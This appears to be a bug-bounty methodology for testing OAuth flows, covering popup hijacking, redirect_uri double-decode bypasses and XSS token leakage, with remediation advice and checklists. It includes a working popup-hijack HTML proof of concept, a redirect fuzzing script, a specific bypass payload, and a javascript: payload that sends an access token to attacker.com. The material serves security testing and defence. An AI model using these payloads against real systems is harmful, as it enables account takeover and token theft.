# OAuth Security Testing Methodology

## Overview

Comprehensive methodology for discovering OAuth vulnerabilities, covering popup hijacking, redirect_uri bypasses, and token leakage. Based on real-world findings with detailed exploitation techniques.

**Success Metrics:**
- Multiple critical OAuth vulnerabilities discovered
- Account takeover via various attack vectors
- Access token leakage exploits
- One-click compromise scenarios

**Sources:** 
- Entry #018 - OAuth Popup Hijacking
- Entry #048 - OAuth redirect_uri Double-Decode Bypass
- Entry #045 - Google AI Studio XSS (OAuth token leak)

---

## Attack Surface Analysis

### OAuth Flow Components

#### 1. Authorization Request
```
https://provider.com/oauth/authorize
  ?client_id=CLIENT_ID
  &redirect_uri=https://app.com/callback
  &state=RANDOM_STATE
  &scope=openid+profile+email
  &response_type=code
```

**Test Points:**
- `redirect_uri` validation
- `state` parameter handling
- `scope` manipulation
- `response_type` variations

#### 2. Authorization Callback
```
https://app.com/callback
  ?code=AUTH_CODE
  &state=RANDOM_STATE
```

**Test Points:**
- Code validation
- State verification
- CSRF protection
- Token exchange security

#### 3. Token Exchange
```
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=AUTH_CODE
&redirect_uri=https://app.com/callback
&client_id=CLIENT_ID
&client_secret=CLIENT_SECRET
```

**Test Points:**
- Client authentication
- Code reuse prevention
- Redirect URI matching
- Token issuance

---

## Vulnerability Class 1: Popup Hijacking

### Attack Vector: Predictable window.open() Target

**Vulnerability:** Static, predictable window name allows iframe hijacking

**Real-World Example:**
```javascript
// VULNERABLE CODE
k = window.open(authorizeUrl, "addons-oauthWindow", 
    `menubar=no,toolbar=no,status=no,width=640,height=575`);
```

### Exploitation Steps

#### Step 1: CSP Bypass via Static Files
**Problem:** Need iframe under target origin, but CSP blocks framing

**Solution:** Static JS files often have relaxed CSP

```html
<iframe
    id="hijackFrame"
    name="addons-oauthWindow"
    src="https://app.target.com/static/chunk.a1b2c3d4.js">
</iframe>
```

**Why This Works:**
- Static files at `/static/*.js` have relaxed CSP
- Omit `frame-ancestors` directive
- Iframe exists under target origin
- Window name pre-registered

#### Step 2: Capture Attacker Callback
1. Create malicious addon/integration with data access permissions
2. Initiate OAuth flow from attacker's own account
3. Complete authentication
4. Intercept final callback URL before execution
5. Store URL (contains authorization code)

**Example Callback:**
```
https://api.target.com/api/auth/callback
  ?code=ATTACKER_CODE
  &state=ATTACKER_STATE
```

#### Step 3: Timing the Redirect
**Detect popup hijack via onload event:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>OAuth Hijack PoC</title>
</head>
<body>
    <button onclick="startAttack()">Open App</button>
    
    <iframe
        id="hijackFrame"
        name="addons-oauthWindow"
        src="https://app.target.com/static/chunk.a1b2c3d4.js"
        style="width:640px; height:575px;">
    </iframe>
    
    <script>
        const attackerCallback = "https://api.target.com/api/auth/callback?code=ATTACKER_CODE&state=ATTACKER_STATE";
        
        function startAttack() {
            // Open legitimate app in new tab
            window.open("https://app.target.com/workspace/addons");
            
            const frame = document.getElementById("hijackFrame");
            let hijacked = false;
            
            frame.onload = function() {
                if (hijacked) return;
                hijacked = true;
                
                // OAuth page loaded in iframe - redirect to attacker callback
                frame.src = attackerCallback;
            };
        }
    </script>
</body>
</html>
```

### Attack Chain

| Step | Action | Result |
|------|--------|--------|
| 1 | Victim visits attacker page with named iframe | Iframe registered under target origin |
| 2 | Victim opens app in new tab | Legitimate app loaded |
| 3 | Victim clicks "Connect" on addon | OAuth flow initiated |
| 4 | App calls `window.open(url, "addons-oauthWindow")` | Browser finds existing iframe |
| 5 | OAuth loads in attacker's iframe | Hijack successful |
| 6 | Attacker's onload handler fires | Redirect to captured callback |
| 7 | Callback sends auth data to `window.opener` | Victim's app receives data |
| 8 | App processes response | Attacker's addon linked to workspace |

### Impact
- Access victim workspace configuration
- Access workspace users PII
- Make actions affecting workspace
- Full account compromise

### Remediation
**Randomize target value per-session:**
```javascript
const randomTarget = `oauth-window-${crypto.randomUUID()}`;
k = window.open(authorizeUrl, randomTarget, windowFeatures);
```

---

## Vulnerability Class 2: redirect_uri Bypass

### Attack Vector: Double-Decode URL Parsing

**Vulnerability:** Discrepancy between URL validator and redirect function

**Real-World Example:** Major automotive company OAuth provider

### Standard Bypasses (Usually Blocked)

#### 1. Path Confusion
```
https://target.com?/callback     → Rejected
https://target.com#/callback     → Rejected
```

#### 2. Domain Substitution
```
https://target.computer/callback  → Rejected
https://targeta.com/callback      → Rejected
```

#### 3. Authority Injection
```
https://target.com@attacker.com/callback   → Rejected
```

#### 4. Domain Concatenation
```
https://a.com.target.computer/callback    → Rejected
https://a.com@.target.computer/callback   → Rejected
```

### Advanced Bypass: Double-Decode Fuzzing

#### Fuzzing Methodology

**Round 1: Single Character (\x00 to \xFF)**
```
https://a.com%FUZZ.target.com/callback
https://target.com%FUZZ/callback
```
Result: Nothing

**Round 2: Two Consecutive Characters (Cluster Bomb)**
```
https://a.com%FUZZ%FUZZ.target.com/callback
```
Result: All rejected

**Round 3: Double-Encode Pattern**
```
https://a.com%25FUZZ%FUZZ.target.com/callback
```
Result: **SUCCESS with `%2523%40`**

### Exploitation

**Payload:**
```
https://a.com%2523%40www.target.com/callback
```

**Character Breakdown:**
- `%2523` = double-encoded `#` (first decode: `%23`, second decode: `#`)
- `%40` = URL-encoded `@`

**Step-by-Step Execution:**

**Step 1: Server-Side Validation**
```
Server decodes once:
https://a.com%23@www.target.com/callback

Parser sees:
- Credentials: a.com%23 (ignored)
- Host: www.target.com
- Path: /callback

Validation: Host is www.target.com → PASS ✓
```

**Step 2: Before 301 Redirect**
```
Server decodes %23 again:
https://a.com#@www.target.com/callback?code=AUTH_CODE

Browser sees:
- Host: a.com
- Fragment: @www.target.com/callback?code=AUTH_CODE

Result: Authorization code leaks to attacker's domain
```

### Fuzzing Script Template

```python
import requests
from itertools import product

target = "https://oauth.target.com/authorize"
client_id = "YOUR_CLIENT_ID"
base_redirect = "https://target.com/callback"

# Round 3: Double-encode fuzzing
for byte1, byte2 in product(range(256), repeat=2):
    payload = f"https://attacker.com%25{byte1:02x}%{byte2:02x}{base_redirect}"
    
    params = {
        "client_id": client_id,
        "redirect_uri": payload,
        "response_type": "code",
        "scope": "openid profile email"
    }
    
    resp = requests.get(target, params=params, allow_redirects=False)
    
    # Check if validation passed
    if resp.status_code == 302:
        location = resp.headers.get("Location", "")
        if "attacker.com" in location:
            print(f"[!] BYPASS FOUND: %25{byte1:02x}%{byte2:02x}")
            print(f"[!] Payload: {payload}")
            print(f"[!] Redirect: {location}")
            break
```

### Impact
- One-click account takeover
- Authorization code leak
- Full account compromise
- No user interaction beyond visiting attacker page

### Remediation
- Validate redirect_uri after ALL decoding steps
- Use allowlist of exact redirect URIs (no pattern matching)
- Ensure validator and redirect function use same parsing logic

---

## Vulnerability Class 3: XSS in OAuth Flow

### Attack Vector: Access Token Leak via XSS

**Vulnerability:** XSS in OAuth callback or related pages

**Real-World Example:** Google AI Studio

### Exploitation Steps

#### Step 1: Find XSS in OAuth Context

**Common Locations:**
- `__cookie_check.html` (auth flow helper)
- Callback endpoints
- Upload endpoints with relaxed CSP
- Static files with HTML rendering

**Example Vulnerable Endpoint:**
```
https://aistudio.google.com/_/upload/[ID]/file/[HASH]

CSP (Before Fix):
content-type: text/html; charset=UTF-8
content-security-policy: default-src 'none'; img-src 'self';
```

#### Step 2: JavaScript Protocol Injection

**Vulnerable Parameter:**
```
https://app.com/__cookie_check.html
  ?return_url=javascript:alert(origin)
```

**Vulnerable Code:**
```javascript
async function redirectToReturnUrl(autoClose, storageAccessGranted = false) {
  const initialReturnUrlStr = new URLSearchParams(window.location.search).get('return_url');
  const returnUrl = initialReturnUrlStr ? new URL(initialReturnUrlStr) : null;
  
  // MISSING: Protocol validation
  
  if (autoClose) {
    window.open(url.toString(), '_blank');
  } else {
    window.location.href = returnUrl.toString();  // ← XSS HERE
  }
}
```

#### Step 3: Token Exfiltration

**Payload:**
```
https://app.com/__cookie_check.html
  ?return_url=javascript:fetch('https://attacker.com/log?token='+localStorage.getItem('access_token'))
```

**Or via iframe:**
```html
<iframe src="https://app.com/__cookie_check.html?return_url=javascript:/* payload */"></iframe>
```

### Impact
- Access token leak
- Full Google account compromise
- OAuth integration abuse
- Permission escalation

### Remediation

**1. Protocol Validation:**
```javascript
if (returnUrl.protocol.toLowerCase() === 'javascript:') {
    console.error('Potentially malicious return URL blocked');
    return;
}
```

**2. Strict CSP:**
```
content-security-policy: sandbox; default-src 'none'; frame-ancestors 'none'
content-type: application/octet-stream
```

**3. Content-Type Enforcement:**
- Change upload endpoints to `application/octet-stream`
- Forces download instead of execution

---

## Testing Checklist

### Popup-Based OAuth

- [ ] Test for predictable window names
- [ ] Check if static files have relaxed CSP
- [ ] Verify iframe name collision behavior
- [ ] Test postMessage origin validation
- [ ] Check window.opener reference handling
- [ ] Test with attacker-controlled callbacks
- [ ] Verify state parameter validation

### redirect_uri Validation

- [ ] Test standard bypasses (?, #, @, domain tricks)
- [ ] Fuzz with single characters (\x00-\xFF)
- [ ] Fuzz with two-character combinations
- [ ] Test double-encode patterns (%25XX%XX)
- [ ] Test at multiple URL positions
- [ ] Verify validation happens after ALL decoding
- [ ] Check for parser discrepancies
- [ ] Test with various URL encoding schemes

### XSS in OAuth Context

- [ ] Test all OAuth-related endpoints for XSS
- [ ] Check `__cookie_check.html` and similar helpers
- [ ] Test return_url/redirect parameters
- [ ] Verify JavaScript protocol blocking
- [ ] Check upload endpoints for HTML injection
- [ ] Test CSP bypass techniques
- [ ] Verify message listener origin checks
- [ ] Check frame-ancestors directives

### Token Handling

- [ ] Test for token leakage in URLs
- [ ] Check localStorage/sessionStorage exposure
- [ ] Verify token expiration
- [ ] Test code reuse prevention
- [ ] Check PKCE implementation (if applicable)
- [ ] Verify state parameter uniqueness
- [ ] Test cross-origin token access

---

## Tools and Techniques

### Fuzzing Tools
```bash
# Burp Intruder for redirect_uri fuzzing
# Cluster bomb attack with double-encode patterns

# ffuf for parameter fuzzing
ffuf -u "https://oauth.target.com/authorize?redirect_uri=FUZZ" \
     -w payloads.txt \
     -mc 302 \
     -fr "error"
```

### Browser DevTools
- Network tab: Monitor OAuth flow
- Console: Test postMessage behavior
- Application tab: Check token storage
- Sources tab: Debug JavaScript execution

### Proxy Tools
- Burp Suite: Intercept and modify OAuth requests
- OWASP ZAP: Automated OAuth testing
- mitmproxy: Script-based OAuth flow analysis

---

## Real-World Examples

### Example 1: Popup Hijacking
**Target:** Major SaaS platform
**Impact:** Workspace PII leak, attacker addon installation
**Bounty:** Undisclosed (Critical severity)

### Example 2: Double-Decode Bypass
**Target:** Global automotive company
**Impact:** One-click account takeover
**Bounty:** Undisclosed (Critical severity)

### Example 3: XSS Token Leak
**Target:** Google AI Studio
**Impact:** Access token leak, full account compromise
**Bounty:** Google VRP (Fast fix)

---

## Key Takeaways

1. **Randomize window names** in OAuth popups
2. **Fuzz systematically** - don't rely only on known bypasses
3. **Test double-decode patterns** at multiple URL positions
4. **Validate after ALL decoding** steps
5. **Block JavaScript protocol** in redirects
6. **Strict CSP** on all OAuth-related pages
7. **External grader** for validation (prevent false positives)
8. **Persistence pays off** - well-tested targets still have bugs

---

## Related Methodologies

- **Multi-Agent Orchestration** (Entry #011): Use agents for systematic OAuth testing
- **AI Agent Self-Validation** (Entry #005, #039): Validate findings before reporting
- **Prompt Injection Framework** (Entry #044): Similar systematic approach

---

**OAuth security requires systematic testing across all flow components.**
